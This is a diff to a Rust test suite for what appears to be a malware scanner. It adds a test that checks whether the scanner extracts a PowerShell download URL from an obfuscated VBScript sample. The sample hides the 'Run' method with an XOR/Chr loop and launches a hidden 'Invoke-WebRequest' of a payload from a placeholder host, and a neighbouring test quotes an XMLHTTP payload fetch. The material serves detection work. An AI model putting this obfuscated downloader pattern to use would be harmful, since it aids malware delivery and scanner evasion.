@@ -20452,6 +20452,33 @@ Execute "sh." & method & " cmd, 0, False""#;
     }
 
     #[test]
+    fn standalone_vbs_execute_redim_xor_chr_loop_method_run_is_expanded() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim method, values, i, cmd
+ReDim values(2)
+values(0) = 51
+values(1) = 20
+values(2) = 15
+method = ""
+For i = 0 To UBound(values)
+    method = method & Chr(values(i) Xor 97)
+Next
+cmd = "powershell -Command Invoke-WebRequest -Uri https://vbs-redim-xor-method.example/payload.ps1"
+Set sh = CreateObject("WScript.Shell")
+Execute "sh." & method & " cmd, 0, False""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-redim-xor-method.example/payload.ps1")),
+            "VBS Execute/ReDim XOR method Run did not extract PS: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
     fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
         let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
         let report = analyze(vbs, &Config::default());
